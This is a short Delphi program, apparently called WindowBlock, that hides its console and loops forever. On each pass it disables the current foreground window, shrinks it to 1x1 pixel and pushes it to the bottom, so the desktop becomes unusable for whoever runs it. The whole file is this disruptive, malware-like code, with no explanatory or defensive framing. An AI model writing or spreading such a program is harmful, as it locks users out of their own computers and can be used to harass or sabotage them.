program WindowBlock;

{$APPTYPE GUI}

{$R *.res}

uses
  Winapi.Windows,
  Winapi.Messages,
  System.SysUtils,
  System.Variants,
  System.Classes;

var
 H: Thandle;
begin
FreeConsole();
while 1=1 do
begin
H := GetForeGroundWindow();
EnableWindow(H,False);
SetWindowPos(H,HWND_BOTTOM,0,0,1,1,SWP_nomove);
end;
end.
